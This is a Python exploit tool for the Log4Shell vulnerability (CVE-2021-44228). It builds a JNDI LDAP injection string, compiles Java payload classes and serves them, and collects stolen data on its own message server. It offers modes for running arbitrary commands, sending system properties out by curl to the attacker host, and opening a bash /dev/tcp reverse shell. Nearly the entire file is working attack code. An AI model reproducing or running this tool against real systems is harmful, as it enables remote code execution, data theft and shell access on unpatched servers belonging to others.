#!/usr/bin/env python3

import argparse
from colorama import Fore, init
import subprocess
import threading
from pathlib import Path
import os
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler, SimpleHTTPRequestHandler
import socket
import multiprocessing
import inquirer
import pyinputplus as pyip
import base64
import json

CUR_FOLDER = Path(__file__).parent.resolve()

def generate_payload(program: str) -> None:
    # writing the exploit to Exploit.java file
    p = Path("Exploit.java")

    try:
        p.write_text(program)
        subprocess.run(["javac", str(p)])
    except OSError as e:
        print(Fore.RED + f'[-] Something went wrong {e}')
        raise e
    else:
        print(Fore.GREEN + '[+] Exploit java class created success')
#<!----------------------->

# start the web server
def resource_server(args) -> None:
    print("[+] Starting Webserver on port {} http://0.0.0.0:{}".format(args["webport"], args["webport"]))
    httpd = HTTPServer(('0.0.0.0', args["webport"]), SimpleHTTPRequestHandler)
    httpd.serve_forever()
#<!----------------------->

#start server to receive messages
def message_server(args) -> None:
    class MyHTTPRequestHandler(BaseHTTPRequestHandler):
        def do_POST(self):    # !important to use 'do_POST' with Capital POST
            if self.path == '/message':
                rawData = (self.rfile.read(int(self.headers['content-length']))).decode('utf-8')
                rawData = base64.b64decode(rawData)

                print('\n')
                print(Fore.RED + '[+] Received a message\n')
                print(rawData)
                print('\n')

            self.send_response(200)
            self.end_headers()             #as of P3.3 this is required

    # start the web server
    print("[+] Starting Message Webserver on port {} http://0.0.0.0:{}".format(args["msgport"], args["msgport"]))
    httpd = HTTPServer(('0.0.0.0', args["msgport"]), MyHTTPRequestHandler)
    httpd.serve_forever()
#<!----------------------->

def ldap_server(args) -> None:
    sendme = "${jndi:ldap://%s:1389/a}" % (args["userip"])
    print(Fore.GREEN + f"[+] Send me: {sendme}\n")
    url = "http://{}:{}/#Exploit".format(args["userip"], args["webport"])
    subprocess.run(["java", "-cp", os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"), "marshalsec.jndi.LDAPRefServer", url])
#<!----------------------->

def setup_servers(args) -> None:
    # create servers
    global s2

    #LDAP Server
    s1 = threading.Thread(target=ldap_server, args=(args,))
    s1.start()

    # Message Webserver
    s2 = multiprocessing.Process(target=message_server, args=(args,))
    s2.start()

    # Resource Webserver
    resource_server(args)
#<!----------------------->

def start_servers(args) -> None:
    try:
        setup_servers(args)
    except KeyboardInterrupt:
        print(Fore.RED + "Interrupting the program.")
        s2.terminate()
        raise SystemExit(0)
#<!----------------------->

def mode_command(args) -> None:

    program = """
public class Exploit {
    public Exploit() {
        Process p;
        try {
            p = Runtime.getRuntime().exec("%s");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
""" % (args["command"])

    generate_payload(program)
    start_servers(args)
#<!----------------------->

def mode_leak(args, is_test, properties) -> None:
    base_curl = "curl -X POST http://{}:{}/message -H 'Content-Type: text/plain'".format(args["userip"], args["msgport"])

    if is_test:
        getProperties = '"It Works!"'
    else:
        getProperties = "\""
        list_len = len(properties)-1

        for index, property in enumerate(properties):
            if index == list_len:
                getProperties += "\""
            else:
                getProperties += "{} -> \" + System.getProperty(\"{}\") + \", ".format(property, property)

    program = """
import java.util.Base64;

public class Exploit {
    public Exploit() {
        Process p;
        try {
            String result = %s;
            String encodedData = Base64.getEncoder().encodeToString(result.getBytes());

            p = Runtime.getRuntime().exec("%s -d " + encodedData);
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
""" % (getProperties, base_curl)

    generate_payload(program)
    start_servers(args)
#<!----------------------->

def mode_shell(args):

    command = "bash -c $@|bash 0 echo bash -i >& /dev/tcp/{}/{} 0>&1".format(args["userip"], args["ncport"])

    program = """
public class Exploit {
    public Exploit() {
        Process p;
        try {
            p = Runtime.getRuntime().exec("%s");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
""" % (command)

    generate_payload(program)
    start_servers(args)
#<!----------------------->

def main() -> None:
    init(autoreset=True)
    print(Fore.BLUE + """
    [!] CVE: CVE-2021-44228
    [!] Author: Sergiu Vidreanu (https://github.com/vidrez)
    [!] Info: Project originally forked from https://github.com/kozmer/log4j-shell-poc
    """)

    local_ip = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2]
    if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)),
    s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET,
    socket.SOCK_DGRAM)]][0][1]]) if l][0][0]

    args = {}

    args["userip"] = pyip.inputStr('IP Host (for ldap server) [{}]> '.format(local_ip), blank=True) or local_ip
    args["webport"] = pyip.inputInt('Webserver Port [9000]> ', blank=True) or 9000
    args["msgport"] = pyip.inputInt('Messages Webserver Port [9001]> ', blank=True) or 9001

    questions = [
        inquirer.List('mode',
                    message="Select the execution mode",
                    choices=['Test RCE', 'Command Execution', 'Information Leak', 'Reverse Shell'],
                ),
    ]
    answer = inquirer.prompt(questions)['mode']

    match answer:
        case 'Command Execution':
            args["command"] = pyip.inputStr('Custom Command > ', blank=False)
            return mode_command(args)
        case 'Information Leak':
            choices = [
              inquirer.Checkbox('interests',
                                message="What information are you interested in? (space to select)",
                                choices=['java.home', 'java.version', 'os.arch', 'os.name', 'os.version', 'user.dir', 'user.home', 'user.name'],
                                ),
            ]
            answers = inquirer.prompt(choices)
            return mode_leak(args, False, answers["interests"])
        case 'Test RCE':
            return mode_leak(args, True, None)
        case 'Reverse Shell':
            args["ncport"] = pyip.inputInt('Porta ncat for reverse shell [9002]', blank=True) or 9002
            print("[*] Start netcat listener on port {} with 'nc -lvnp {}'\n".format(args["ncport"], args["ncport"]))
            return mode_shell(args)
        case _:
            print(Fore.RED + "Something went wrong")
            raise SystemExit(0)
            return False

if __name__ == "__main__":
    main()
